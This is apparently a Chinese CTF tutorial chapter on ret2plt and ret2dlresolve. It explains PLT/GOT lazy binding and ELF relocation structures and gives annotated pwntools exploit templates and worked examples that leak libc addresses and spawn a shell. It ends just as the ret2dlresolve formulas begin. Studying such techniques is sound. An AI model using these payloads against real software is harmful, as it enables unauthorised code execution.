# 06 ret2plt 与 ret2dlresolve

## 本章速览

| 技术 | 一句话原理 | 何时使用 | 前置条件 | 难度 |
|------|-----------|---------|---------|------|
| ret2plt 泄露 | 直接调用 `write@plt`/`puts@plt`，把 GOT 里已解析的 libc 地址打印出来 | 程序没给 libc、没 `system@plt`，需要先泄露再打 | 有输出函数的 PLT；能通过寄存器/栈控制其参数 | ★★☆ |
| ret2plt 写入 | 调用 `read@plt`/`gets@plt` 把 `"/bin/sh"`、第二段 payload 搬进 bss | 二进制里没有 `"/bin/sh"` 字符串；或需要无限长度 payload | 有输入函数 PLT；bss 地址已知且可写 | ★★☆ |
| ret2plt 组合 | leak → 写参数 → 回 main 二次溢出 → `system("/bin/sh")` | 一次溢出做不完所有事时的标准节奏 | 偏移已知；能重入 main / 自循环 read | ★★★ |
| ret2dlresolve（32 位） | 伪造 `Elf32_Rel`/`Elf32_Sym`/字符串，骗 `_dl_runtime_resolve` 帮我们解析 `system` | 无 libc、无 `system@plt`、溢出长度有限 | **Partial RELRO 或 No RELRO**（延迟绑定未关） | ★★★★ |
| ret2dlresolve（64 位） | 同上，但重定位结构是 RELA、还要躲开版本检查（versym） | 同上 | 同上，且需处理 `.gnu.version` 越界问题 | ★★★★★ |
| dlresolve + 栈迁移 | 溢出放不下整条链，先把 ROP 迁到 bss 再触发 dlresolve | 溢出只有几十字节 | 有 `leave; ret` / `pop ebp; ret` 等 pivot gadget | ★★★★ |

> 本章与 05 章（ret2libc）关系密切：ret2plt 可以看作"不依赖 libc 文件版本的 ret2libc 前置戏"，而 ret2dlresolve 则是"连 libc 都懒得泄露"的终极懒人方案。两者都建立在"PLT/GOT 延迟绑定"这同一个地基上。

---

# 第一部分 ret2plt

## 1. 概念

**ret2plt**：不直接跳 libc，而是跳到二进制**自己 PLT 表里**的函数，借用它们完成两件事：

1. **leak（泄露）**：`write@plt` / `puts@plt` / `printf@plt` 把某个 **GOT 表项**的内容打印出来。GOT 里存的是该函数在 libc 中的**真实地址**，拿到真实地址再减去 libc 里该符号的偏移，就得到 libc 基址——但注意：**ret2plt 的手法本身完全不需要关心 libc 基址**，它只是老老实实"调函数、传参数"。
2. **写入（搬运）**：`read@plt` / `gets@plt` / `scanf@plt` 把我们 second stage 的数据（`"/bin/sh"` 字符串、伪结构体、甚至整条新 ROP 链）读进可写段（通常是 bss），弥补"栈上一次性 payload 不够长 / 缺字符串"的问题。

理解 ret2plt 的关键是：**PLT 里的函数和普通函数没有区别，只要我们能控制它的参数（32 位靠栈、64 位靠 rdi/rsi/rdx），就能让它替我们干活**。

```text
        我们控制的返回地址
              │
              ▼
   ┌─────────────────────┐        ┌──────────────────────────┐
   │  write@plt          │──────► │ GOT[write] = libc 真地址  │ ──► 打印出来 = 泄露
   └─────────────────────┘        └──────────────────────────┘
   ┌─────────────────────┐        ┌──────────────────────────┐
   │  read@plt           │──────► │ bss 可写区域              │ ◄── 写入 "/bin/sh"/payload
   └─────────────────────┘        └──────────────────────────┘
```

### 与相邻技术的关系

| 技术 | 需要知道 libc 基址？ | 需要目标函数在 PLT 里？ | 典型用途 |
|------|:---:|:---:|------|
| ret2text（02 章） | 否 | 否 | 跳二进制里现成代码 |
| ret2syscall（04 章） | 否 | 否（要 int 0x80 gadget） | 无 system、静态/半静态二进制 |
| **ret2plt（本章）** | **手法本身不需要** | **是** | 无 libc 文件时先 leak 后打 |
| ret2libc（05 章） | 是 | 否 | 拿到基址后调 system |
| ret2dlresolve（本章后半） | 否 | 否（伪造解析） | 连 leak 都省了 |

---

## 2. write@plt 泄露 GOT

### 2.1 原理：write(1, read@got, 4)

`write(fd, buf, count)` 会把 `buf` 开始 `count` 字节原样打到文件描述符 `fd`。把 `buf` 填成某个 GOT 表项地址（例如 `read@got`），就等于把 libc 里 `read` 的真实地址打印出来。

**32 位：参数全部走栈**（cdecl），所以要在返回地址后面手工摆一张"参数 + 假返回地址"的桌子：

```text
栈（低地址在上）                    作用
+------------------------+ ◄── ret 后 ESP 指这里
| write@plt              |  返回地址被覆盖为 write@plt，ret 即"调用 write"
+------------------------+
| pppr 地址               |  write 的"返回地址"：pop;pop;pop;ret
+------------------------+     用来吃掉下面 3 个参数再干净地 ret
| 0x00000001             |  arg1: fd = 1 (stdout)
+------------------------+
| read@got               |  arg2: buf = GOT 表项（里面是 libc 地址）
+------------------------+
| 0x00000004             |  arg3: count = 4（32 位地址 4 字节）
+------------------------+
| main 地址               |  pppr ret 到这里 → 程序重跑 main，等第二轮输入
+------------------------+
```

对应 payload：

```python
payload  = b'A' * offset            # 填充到 saved EIP
payload += p32(write_plt)           # 要"调用"的函数
payload += p32(pppr)                # 函数的假返回地址：pop ebx;pop esi;pop ebp;ret
payload += p32(1)                   # write 的 arg1
payload += p32(read_got)            # write 的 arg2
payload += p32(4)                   # write 的 arg3
payload += p32(main_addr)           # pppr ret 回 main，准备第二轮
```

执行流：`ret → write@plt`，write 从栈上（pppr 下方）取到 3 个参数把 GOT 打出来；write 返回时弹走的是 pppr，pppr 再 pop 三次吃掉参数、ret 到 main。**这就是 32 位 ROP 调多参函数的标准"函数 + 假返回地址 + 参数"三明治结构。**

**64 位：参数走寄存器**（System V AMD64：rdi, rsi, rdx, rcx, r8, r9），栈上只放地址链：

```text
寄存器侧                              栈侧（payload 从返回地址开始依次摆）
rdi = 1        ◄── pop rdi; ret       +----------------+
rsi = read@got ◄── pop rsi; pop r15   | pop rdi; ret   |
rdx = 8        ◄── pop rdx; ret       | 1              |
                                          +----------------+
                                          | pop rsi;r15;ret|
                                          | read@got       |
                                          | 0xdeadbeef(r15)|
                                          +----------------+
                                          | pop rdx; ret   |
                                          | 8              |
                                          +----------------+
                                          | write@plt      |
                                          | main           |  ← write 返回到 main
                                          +----------------+
```

对应 payload：

```python
payload  = b'A' * offset
payload += p64(pop_rdi)      + p64(1)           # rdi = 1
payload += p64(pop_rsi_r15)  + p64(read_got)    # rsi = read@got
payload += p64(0xdeadbeef)                      # r15 随便填（吃掉弹出的第二个值）
payload += p64(pop_rdx)      + p64(8)           # rdx = 8（有这个 gadget 最好）
payload += p64(write_plt)                       # write(1, read@got, 8)
payload += p64(main_addr)                       # 回 main 等第二轮
```

> 64 位没有 `pop rdx; ret` 很常见（rdx 是"冷寄存器"）。此时三条路：① 用 `__libc_csu_init` 的 gadget 给 rdx 赋值（详见 07 章 ret2csu）；② 改用不需要 rdx 的 `puts@plt`；③ `mov rdx, ...` 类 gadget（`csu` 第二段本身就是干这个的）。

### 2.2 puts@plt / printf@plt 等价方案对比

| 方案 | 调用形式 | 传参需求 | 优点 | 坑 |
|------|---------|---------|------|----|
| `write@plt` | `write(1, got, n)` | 32 位要 3 个栈参数；64 位要 rdi+rsi+**rdx** | 长度精确、不会截断 | 64 位缺 `pop rdx` 时难搞 |
| `puts@plt` | `puts(got)` | 只需 rdi（32 位 1 个栈参数） | 参数最少，64 位最友好 | 遇 `\x00` 截断；GOT 高位字节是 `\x00` 时（64 位只泄出 6 字节）要注意接收长度；若地址中间含 `\x00` 会被提前截断 |
| `printf@plt` | `printf(got)` | 只需 rdi | 同 puts | GOT 内容被当**格式串**解析，若地址字节里出现 `%` 会乱套甚至 `%s` 崩溃——不推荐 |
| `dprintf@plt` | 同 printf | 同上 | — | 同上，还更少见 |

**经验法则**：64 位优先 `puts@plt`（只管 rdi）；32 位优先 `write@plt`（栈参数随便摆，不依赖 gadget）。泄露目标优先选**一定已被解析过**的 GOT（如 `read@got`、`puts@got`、`__libc_start_main@got`），延迟绑定下只有"调用过至少一次"的函数 GOT 才有真实地址。

### 2.3 泄露后怎么算

```python
io.recvuntil(b'...')                    # 把 write 之前的前缀吃干净
leak = u32(io.recv(4))                  # 32 位；64 位用 u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['read']   # 有 libc 文件时
# 没有 libc 文件 → LibcSearcher('read', leak)，或按 05 章的 libc 数据库方法
system_addr = libc.symbols['system']
binsh_addr  = next(libc.search(b'/bin/sh\x00'))
```

---

## 3. read@plt 写内存

### 3.1 原理：read(0, bss_addr, size)

`read(0, addr, n)` 从标准输入读 `n` 字节到 `addr`。把 `addr` 指到 bss，就能把：

- `"/bin/sh\x00"` 字符串——给后面 `system(bss)` 当参数；
- shellcode——仅当 **NX 关闭**且 bss 可执行时（少见）；
- 第二段大 payload / ret2dlresolve 伪结构体（本章后半的重头戏）；
- 一整条新 ROP 链——配合栈迁移实现"无限长度注入"。

32 位布局（沿用三明治）：

```text
+------------------------+
| read@plt               |   "调用" read
+------------------------+
| pppr                   |   假返回地址，吃完 3 个参数
+------------------------+
| 0                      |   arg1: fd = 0 (stdin)
+------------------------+
| bss_addr               |   arg2: 写到哪
+------------------------+
| 8                      |   arg3: 读几个字节（够放 "/bin/sh\0"）
+------------------------+
| system@plt（或下一跳）   |   read 返回后接着执行
+------------------------+
| 假 ret                 |   system 的返回地址
+------------------------+
| bss_addr               |   system 的参数 = 刚写进去的 "/bin/sh"
+------------------------+
```

一次溢出内完成"**写参数 + 立即调用**"：`read` 先把 `"/bin/sh"` 放进 bss，`pppr` 清参返回后直接落到 `system@plt`，参数取的就是 `bss_addr`。这就是**纯 ret2plt getshell**：全程只用 PLT 里的函数，一个 libc 地址都不用算（前提是 `system` 本身被导入、在 PLT 里）。

### 3.2 与泄露组合：两种节奏

**节奏 A —— 二次溢出（最常用）**

```text
第 1 次溢出: [write@plt 泄露 GOT] → [read@plt 写 "/bin/sh" 进 bss] → ret 回 main
                    │
第 2 次溢出: [system(算出来的地址, bss)]  →  getshell
```

**节奏 B —— 栈迁移后无限 ROP（"自循环 read"）**

当 payload 要做的动作太多、一次栈空间放不下时，把 `read@plt` 变成一个"续杯泵"：

```text
第 n 段 payload（在栈上）                read 把下一大段读到 pivot(bss)
┌──────────────────┐                     ┌───────────────────────────┐
│ ...当前链...      │                     │ pivot:  新 ROP 链开头       │
│ read@plt         │ ──stdin──►          │   ...                     │
│ pppr             │                     │   read@plt  ← 再读一段     │
│ 0                │                     │   pppr                    │
│ pivot_addr       │                     │   pivot_addr              │
│ 0x400            │                     │   0x400                   │
│ pop ebp; ret     │ ◄─ ebp = pivot      │   pop ebp; ret            │
│ pivot_addr       │                     │   pivot_addr              │
│ leave; ret       │ ── esp=ebp, 迁移 ──►│   leave; ret  ← 迁回自己   │
└──────────────────┘                     └───────────────────────────┘
        ▲                                            │
        └────────────── 无限续杯，每次都能再注入一段 ◄──┘
```

`leave` 等价于 `mov esp, ebp; pop ebp`，配合先 `pop ebp`（置 ebp=pivot）再 `leave; ret`，就把执行流搬到了 pivot 处的新链上；新链末尾再放一对 `pop ebp; leave; ret`，即可无限往 bss 灌 payload。这套"read + pivot 循环"同样是 ret2dlresolve 的标准前置（先把伪结构体读进 bss）。

---
## 4. ret2plt 组合套路详解

### 4.1 套路总图：一次溢出 leak + 二次溢出 getshell

```text
                     ┌───────────────────────────────────────────────┐
                     │              第 1 次 main 溢出                 │
                     │                                               │
   padding ──► write@plt(1, read@got, 4)   ← 泄露 read 在 libc 的真地址
        │           │ pppr 清参
        │           ▼
        │      read@plt(0, bss, 8)              ← 顺手把 "/bin/sh" 写进 bss
        │           │ pppr 清参
        │           ▼
        └────► main 重新执行                        （第 1 轮结束，算 libc 基址）
                            │
                     ┌───────────────────────────────────────────────┐
                     │              第 2 次 main 溢出                 │
                     │                                               │
   padding ──► system(libc_system_addr, bss)   ← system("/bin/sh") getshell
                     └───────────────────────────────────────────────┘
```

拆开看，这个套路只用到三种"积木"：

1. **泄密积木**：`write@plt`/`puts@plt` + GOT 地址；
2. **搬运积木**：`read@plt`/`gets@plt` + bss 地址；
3. **返场积木**：链尾放 `main` 让程序重跑（前提 main 里还有第二次输入点）。

### 4.2 32 位完整 exp 模板（逐行注释）

适用场景：32 位、Partial RELRO、No PIE、NX 开、无 canary；程序导入 `read`/`write`，无 `system`；给 libc 文件（没给就用 LibcSearcher）。

```python
#!/usr/bin/env python3
# exp_ret2plt_32.py —— 32 位 ret2plt：write 泄露 + read 写参 + 二次溢出 getshell
from pwn import *

context(arch='i386', os='linux', log_level='info')

elf  = ELF('./pwn')
libc = ELF('./libc-2.23.so')          # 题目给的 libc；没有则改用 LibcSearcher
io   = process('./pwn')               # 远程改 remote('ip', port)

# ---- 第一步：收集地址（全部来自本二进制，不依赖 ASLR） ----
write_plt = elf.plt['write']          # 用来泄露
read_plt  = elf.plt['read']           # 用来写内存
read_got  = elf.got['read']           # 泄露目标：read 的真实地址
main_addr = elf.symbols['main']       # 链尾返场
bss_addr  = elf.bss() + 0x300         # bss 尾部挑块没人用的地方放 "/bin/sh"

offset = 0x2c                         # 覆盖到 saved EIP 的填充长度（cyclic 测出）
pppr   = 0x08048509                   # pop ebx; pop esi; pop ebp; ret（ROPgadget 找）

# ---- 第二步：第 1 轮 payload = leak + write + 返场 ----
payload  = b'A' * offset              # 填充
payload += p32(write_plt)             # 调 write
payload += p32(pppr)                  # write 的假返回地址
payload += p32(1)                     #   fd  = stdout
payload += p32(read_got)              #   buf = read@got
payload += p32(4)                     #   len = 4
payload += p32(read_plt)              # 接着调 read
payload += p32(pppr)                  # read 的假返回地址
payload += p32(0)                     #   fd  = stdin
payload += p32(bss_addr)              #   buf = bss
payload += p32(8)                     #   len = 8（放 "/bin/sh\0" 绰绰有余）
payload += p32(main_addr)             # pppr ret 回 main，进入第 2 轮

io.sendlineafter(b'input:', payload)  # 触发第 1 轮
io.send(b'/bin/sh\x00')               # 这 8 字节被 read@plt 收进 bss

# ---- 第三步：取泄露，算 libc 基址 ----
io.recvline()                         # 吃掉 write 前的程序输出（按题面调整）
read_addr = u32(io.recv(4))           # GOT 里 read 的真实地址
log.success('read  @ ' + hex(read_addr))
libc.address = read_addr - libc.symbols['read']          # libc 基址
log.success('libc base = ' + hex(libc.address))

# ---- 第四步：第 2 轮 = 直接 system("/bin/sh") ----
payload2  = b'A' * offset
payload2 += p32(libc.symbols['system'])   # 32 位：函数地址
payload2 += p32(0xdeadbeef)               # system 的假返回地址
payload2 += p32(bss_addr)                 # 参数：刚写进 bss 的 "/bin/sh"
io.sendlineafter(b'input:', payload2)

io.interactive()
```

### 4.3 64 位完整 exp 模板（逐行注释）

适用场景：64 位、Partial RELRO、No PIE、NX 开、无 canary；用 `puts@plt` 泄露（避开 rdx 难题）。

```python
#!/usr/bin/env python3
# exp_ret2plt_64.py —— 64 位 ret2plt：puts 泄露 + 二次溢出 getshell
from pwn import *

context(arch='amd64', os='linux', log_level='info')

elf  = ELF('./pwn')
libc = ELF('./libc-2.27.so')
io   = process('./pwn')

puts_plt  = elf.plt['puts']
read_got  = elf.got['read']           # read 一定被调用过，GOT 已解析
main_addr = elf.symbols['main']

# ---- gadget（ROPgadget --binary pwn | grep ...） ----
pop_rdi     = 0x4007f3                # pop rdi; ret
pop_rsi_r15 = 0x4007f1                # pop rsi; pop r15; ret

offset = 0x48                         # 覆盖到 saved RIP 的填充长度

# ---- 第 1 轮：puts(read@got) 泄露，再回 main ----
payload  = b'A' * offset
payload += p64(pop_rdi)               # rdi = 泄露目标
payload += p64(read_got)
payload += p64(puts_plt)              # puts(read@got)：打印 6 字节地址（\x00 截断）
payload += p64(main_addr)             # 返场
io.sendlineafter(b'input:', payload)

io.recvline()                                     # 吃掉 "input:" 一行
read_addr = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))  # 6 字节补 0
log.success('read @ ' + hex(read_addr))
libc.address = read_addr - libc.symbols['read']

# ---- 第 2 轮：pop rdi 装参数，调 system ----
binsh = next(libc.search(b'/bin/sh\x00'))
payload2  = b'A' * offset
payload2 += p64(pop_rdi)
payload2 += p64(binsh)                # rdi = "/bin/sh"
payload2 += p64(libc.symbols['system'])
payload2 += p64(0xdeadbeef)           # 假返回地址（对齐用，见 09 章 stack alignment 亦可加 ret）
io.sendlineafter(b'input:', payload2)

io.interactive()
```

> 若第 2 轮还想继续用 ret2plt 而不碰 libc 基址（例如 `system` 已在 PLT），把 `libc.symbols['system']` 换成 `elf.plt['system']`、`binsh` 换成上一轮 `read@plt` 写进 bss 的地址即可。

### 4.4 变体与细节

- **gets@plt 替代 read@plt**：`gets(buf)` 只有一个参数，32/64 位都更好摆；但 gets 遇 `\n` 截断，构造的字节里不能有 `0x0a`。
- **泄露哪个 GOT**：优先 `__libc_start_main@got`（main 一开始就调它，必然已解析）；其次 `read/puts/printf` 等确定调用过的。
- **程序没有第二次输入点**：链尾不放 `main`，放 `vuln` 函数（或 `main` 内的读输入函数调用点）也行；再不行就用节奏 B 的自循环 read。
- **溢出长度不够摆下整条链**：先摆前半段 + 栈迁移（见 3.2 节自循环 read，或 07 章 pivot），把后半段链读进 bss 再执行。

---

## 5. 典型例题（ret2plt）

### 例题 1：纯 ret2plt —— read 写参数 + system@plt 一步到位

**题目源码（伪 C）**

```c
// gcc -m32 -no-pie -fno-stack-protector -o pwn pwn.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char note[0x100];                       // bss：全局可写

int main(void) {
    char buf[0x20];
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("give me your payload:");
    read(0, buf, 0x80);                 // 0x20 的栈缓冲读 0x80 → 可溢出 0x60
    if (buf[0] == 'A')
        system("echo ok");              // 使 system 进入 PLT/GOT（延迟绑定）
    return 0;
}
```

**checksec**

```text
$ checksec pwn
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

**思路**

- 栈偏移：`buf` 0x20 + saved EBP 4 = **0x24** 字节后是返回地址。
- 二进制里有 `system@plt`，但**没有** `"/bin/sh"` 字符串（`"echo ok"` 不行）。
- 解法：一次溢出内先用 `read@plt` 把 `"/bin/sh\0"` 写进 bss（`note` 地址处），接着调用 `system@plt(note)`。全程不需要 libc 基址、不需要二次溢出。
- gadget：`pop ebx; pop esi; pop ebp; ret` 清参用（32 位 3 参函数需要）。

**完整 exp**

```python
#!/usr/bin/env python3
from pwn import *

context(arch='i386', os='linux', log_level='info')
elf = ELF('./pwn')
io  = process('./pwn')

read_plt   = elf.plt['read']
system_plt = elf.plt['system']
bss        = elf.symbols['note']      # 0x0804A040（示例值）
pppr       = 0x08048509               # pop ebx; pop esi; pop ebp; ret
offset     = 0x24                     # buf(0x20) + saved ebp(4)

payload  = b'A' * offset
# —— 先调 read(0, note, 8) 把 "/bin/sh" 放进 bss ——
payload += p32(read_plt)
payload += p32(pppr)                  # read 的假返回地址
payload += p32(0)                     # fd = stdin
payload += p32(bss)                   # buf = note
payload += p32(8)                     # len
# —— 再调 system(note) ——
payload += p32(system_plt)
payload += p32(0xdeadbeef)            # system 的假返回地址
payload += p32(bss)                   # 参数 = "/bin/sh"
io.sendlineafter(b'payload:', payload)
io.send(b'/bin/sh\x00')               # read@plt 吃到的第二段输入

io.interactive()
```

> 这道题展示了 ret2plt 最小闭环：**输入函数写参数 + 输出/系统函数消费参数**。若题目把 `read` 换成 `gets`，`gets(bss)` 一个参数更省，但注意 `"/bin/sh"` 里没有 `\n`，安全。

### 例题 2：write@plt 泄露 + 二次溢出（64 位）

**题目源码（伪 C）**

```c
// gcc -m64 -no-pie -fno-stack-protector -o pwn pwn.c
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char buf[0x40];
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("welcome to ret2plt");
    read(0, buf, 0x100);                // 0x40 的栈缓冲读 0x100 → 可溢出
    write(1, "bye\n", 4);
    return 0;                           // 每轮结束后可重新运行（外层 while 也常见）
}
```

**checksec**

```text
$ checksec pwn
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

**思路**

- 偏移：`buf` 0x40 + saved RBP 8 = **0x48**。
- 程序只导入 `read/puts/write`，没有 system，也没给 libc 文件。
- 节奏 A：第 1 轮 `puts(read@got)` 泄露 → LibcSearcher 匹配 libc → 回 main；第 2 轮 `system("/bin/sh")`。
- gadget：`pop rdi; ret` 必须有；`puts` 只需 rdi，完美绕开 rdx。

**完整 exp**

```python
#!/usr/bin/env python3
from pwn import *
from LibcSearcher import LibcSearcher

context(arch='amd64', os='linux', log_level='info')
elf = ELF('./pwn')
io  = process('./pwn')

puts_plt  = elf.plt['puts']
read_got  = elf.got['read']
main_addr = elf.symbols['main']
pop_rdi   = 0x400803                  # ROPgadget --binary pwn | grep "pop rdi"
offset    = 0x48

# —— 第 1 轮：泄露 read 真实地址 ——
payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main_addr)             # 返场
io.sendlineafter(b'ret2plt', payload)

io.recvline()                         # 吃 "welcome..." 残留
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success('read @ ' + hex(leak))

libc = LibcSearcher('read', leak)     # 无 libc 文件时的匹配方案
libc_base = leak - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr  = libc_base + libc.dump('str_bin_sh')

# —— 第 2 轮：getshell ——
payload2  = b'A' * offset
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)
payload2 += p64(0xdeadbeef)
io.sendlineafter(b'ret2plt', payload2)

io.interactive()
```

**两道例题小结**：例 1 是"**不泄露**"的纯 ret2plt（函数都在 PLT 里）；例 2 是"**泄露型**"ret2plt（先借 PLT 输出 GOT，再转入 ret2libc）。实战里按"缺什么补什么"选择：缺字符串→read 写；缺函数地址→write/puts 泄；两者都缺→组合套路全上。

---
# 第二部分 ret2dlresolve

## 6. 延迟绑定原理深讲

### 6.1 为什么会有延迟绑定

动态链接的程序调用 libc 函数时，编译期并不知道函数最终地址，于是引入 **PLT（过程链接表）+ GOT（全局偏移表）**：第一次调用某函数时才去解析它的真实地址（**延迟绑定，Lazy Binding**），解析结果写进 GOT，之后每次调用直接从 GOT 跳。

关键数据结构（32 位为例）：

| 结构 | 所在节 | 内容 | 由谁维护 |
|------|--------|------|---------|
| GOT（.got.plt） | 数据段 | GOT[0]=.dynamic 地址；GOT[1]=link_map；GOT[2]=`_dl_runtime_resolve`；GOT[3+i]=第 i 个导入函数地址（初始指向 PLT 第二条指令） | 动态链接器 |
| PLT | 代码段 | PLT0 是公共入口；每个函数 3 条指令的桩 | 编译器生成 |
| `.rel.plt` | 只读数据 | `Elf32_Rel` 数组，每项 8 字节：GOT 槽地址 + 重定位信息 | 编译器生成 |
| `.dynsym` | 只读数据 | `Elf32_Sym` 数组，每项 16 字节：符号名偏移、值、大小、类型 | 编译器生成 |
| `.dynstr` | 只读数据 | 符号名字符串池，`\x00` 分隔 | 编译器生成 |
| `.dynamic` | 数据段 | `DT_PLTGOT / DT_JMPREL / DT_SYMTAB / DT_STRTAB / DT_SYMENT` 等键值对，指明上面各节的地址 | 编译器生成 |

### 6.2 一次"首次调用"的完整流程（32 位画图详解）

以程序第一次 `call read@plt` 为例：

```text
        call read@plt
             │
             ▼
┌─────────────────────────────┐        首次: GOT[read] 还没真实地址，
│ read@plt:                   │        初始值 = 下面 push 指令的地址
│   jmp *[read@got] ──────────┼───┐
│                             │   │  非首次: GOT 里已是真实地址，
│   push 0x0  ◄───────────────┼───┘  直接 jmp 过去完事
│      │                      │
│      │ reloc_index = 0      │  ← 本函数在 .rel.plt 中的【下标】
│      ▼                      │
│   jmp PLT0                  │
└─────────────────────────────┘
             │
             ▼
┌─────────────────────────────┐
│ PLT0 (0x8048400):           │
│   push [GOT+4]   ───────────┼──► push link_map （来自 GOT[1]）
│   jmp  [GOT+8]   ───────────┼──► jmp _dl_runtime_resolve
└─────────────────────────────┘   （来自 GOT[2]，动态链接器装载时填好）
             │
             ▼
   _dl_runtime_resolve(link_map, reloc_index)
   ─────────────────────────────────────────
   ① 取 Elf32_Rel   : reloc = JMPREL + reloc_index * 8
                      （JMPREL = .rel.plt 地址，link_map→DT_JMPREL）
   ② 拆 r_info      : sym_index = r_info >> 8        （高 24 位）
                      reloc_type = r_info & 0xff = 7 （R_386_JUMP_SLOT）
   ③ 取 Elf32_Sym   : sym = SYMTAB + sym_index * 16
                      （SYMTAB = .dynsym 地址，每项 16 字节）
   ④ 取符号名       : name = STRTAB + sym->st_name
                      （STRTAB = .dynstr 地址，st_name 是字节偏移）
   ⑤ 查找符号       : 在依赖库的符号表里按 "read" 哈希查找 → 真实地址
   ⑥ 回写 GOT       : *reloc->r_offset = 真实地址   （r_offset 就是 read@got）
   ⑦ 跳过去         : jmp 真实 read —— 栈上还留着调用者的返回地址，一切如常
```

`_dl_runtime_resolve` 的**两个参数从哪来**：

```text
低地址 ─────────────────────────────────────────► 高地址
┌─────────────┬─────────────┬─────────────┬─────────────────┐
│ reloc_index │  link_map   │ 调用者返回地址│   ...更早的栈    │
└─────────────┴─────────────┴─────────────┴─────────────────┘
   ▲ read@plt    ▲ PLT0 的       ▲ call read@plt 压入的
   │ 的 push 0    │ push [GOT+4]  │
   └─ 参数 2       └─ 参数 1        └─ resolve 完后由被解析函数 ret 回去
```

- **reloc_index**：来自函数 PLT 桩里的 `push i`——每个函数写死自己的下标；
- **link_map**：来自 `GOT[1]`——动态链接器加载时把本 elf 的 `link_map` 句柄塞进 `GOT[1]`，把 `_dl_runtime_resolve` 地址塞进 `GOT[2]`（这也是 `_dl_runtime_resolve` 能顺着 link_map 找到 `DT_JMPREL/DT_SYMTAB/DT_STRTAB` 的原因）。

### 6.3 结构体逐字段（32 位）

```c
/* Elf32_Rel —— .rel.plt 的元素，8 字节 */
typedef struct {
    Elf32_Addr r_offset;   /* 4 字节：解析结果写回哪里（= 该函数的 GOT 槽）     */
    Elf32_Word r_info;     /* 4 字节：高 24 位 = .dynsym 下标；低 8 位 = 类型(7) */
} Elf32_Rel;

/* Elf32_Sym —— .dynsym 的元素，16 字节 */
typedef struct {
    Elf32_Word    st_name;   /* 4 字节：符号名在 .dynstr 中的【字节偏移】          */
    Elf32_Addr    st_value;  /* 4 字节：符号地址（解析前为 0）                     */
    Elf32_Word    st_size;   /* 4 字节：符号大小                                   */
    unsigned char st_info;   /* 1 字节：绑定(高4位)+类型(低4位)，全局函数=0x12     */
    unsigned char st_other;  /* 1 字节：可见性，一般 0                             */
    Elf32_Section st_shndx;  /* 2 字节：所在节索引，一般 0                         */
} Elf32_Sym;
```

用 `readelf` 实地对照一份 32 位二进制：

```text
$ readelf -d pwn | grep -E 'PLTGOT|JMPREL|SYMTAB|STRTAB|SYMENT'
 0x00000003 (PLTGOT)      0x804b000        ← GOT 地址
 0x00000017 (JMPREL)      0x8048350        ← .rel.plt 地址
 0x00000006 (SYMTAB)      0x80481cc        ← .dynsym 地址
 0x00000005 (STRTAB)      0x804826c        ← .dynstr 地址
 0x0000000b (SYMENT)      16 (bytes)       ← Elf32_Sym 步长

$ readelf -r pwn
Relocation section '.rel.plt' at offset 0x150 contains 6 entries:
 Offset     Info    Type            Sym. Value  Sym. Name
 0804b00c  00000107 R_386_JUMP_SLOT  00000000   read@GLIBC_2.0
 0804b010  00000207 R_386_JUMP_SLOT  00000000   puts@GLIBC_2.0
 ...
# read 这一项：reloc_index=0 → Info = 0x00000107
#   低 8 位 0x07 = R_386_JUMP_SLOT
#   高 24 位 0x001 = .dynsym 里下标为 1 的符号
```

---

## 7. 攻击思路：让链接器替我们解析任意符号

### 7.1 核心洞察

第 6 节的流程里，**reloc_index 是完全不受校验的整数**：`_dl_fixup` 只是老老实实做 `JMPREL + index*8`。如果我们：

1. 在**可写段**（bss）里伪造一个 `Elf32_Rel`，其 `r_info` 指向一个**伪造的 `Elf32_Sym`**；
2. 伪 Sym 的 `st_name` 指向我们在 bss 里放的字符串 **`"system\0"`**；
3. 然后不通过正常 PLT 桩，而是**直接 ret 到 PLT0，并把自选的 reloc_index 摆在栈上**——

那么 `_dl_runtime_resolve` 就会按我们的表项把 **"system"** 解析出来、跳过去执行。整个过程不需要 libc 文件、不需要泄露任何地址。

### 7.2 手工 payload 布局（32 位，逐字节讲解）

**栈上（第一次/唯一一次溢出）**：

```text
低地址
+------------------------+
| padding                |  覆盖到 saved EIP（cyclic 测出 offset）
+------------------------+
| PLT0 地址               |  ← ret 到 PLT0 的第一条指令 push [GOT+4]
+------------------------+
| reloc_index            |  ← PLT0 视其为"PLT 桩 push 过的下标"（见下框）
+------------------------+
| fake_ret (0xdeadbeef)  |  ← 解析出 system 后，system 的"返回地址"
+------------------------+
| bss 伪区地址            |  ← system 的参数：bss 里我们放的 "/bin/sh"
+------------------------+
高地址
```

> **为什么这样可行**：正常流程中 `_dl_runtime_resolve` 被跳到时，栈顶往下依次是 `[reloc_index][link_map][调用者ret]`。我们 ret 进 PLT0 时，栈顶下一个双字恰好处在"reloc_index"的位置——它就是我们的自选下标；PLT0 再压 link_map 后，链接器看到的世界与正常调用一模一样。解析完成后链接器清掉这两个值并跳到 system，于是 `fake_ret` 和参数的位置也和正常调用 `call system` 之后完全一致。

**bss 上（用 read@plt 或 gets@plt 先送进去）**：

```text
bss_base
+0x00  "/bin/sh\0"                    ← system 的参数
+0x10  ┌─ 伪 Elf32_Rel（8 字节）──────────┐
       │ r_offset = 可写地址(如 +0x200)   │ ← 解析结果写这里，只要是可写内存即可
       │ r_info   = (sym_index << 8) | 7  │ ← 类型必须是 R_386_JUMP_SLOT = 7
       └─────────────────────────────────┘
+0x20  ┌─ 伪 Elf32_Sym（16 字节）─────────┐
       │ st_name  = "system"的dynstr偏移  │ ← STRTAB + st_name 应落在我们的 "system\0"
       │ st_value = 0                     │
       │ st_size  = 0                     │
       │ st_info  = 0x12                  │ ← GLOBAL | FUNC
       │ st_other = 0, st_shndx = 0       │
       └─────────────────────────────────┘
+0x30  "system\0"                     ← 伪造的符号名字符串
```

**三个关键计算式**（务必记住）：
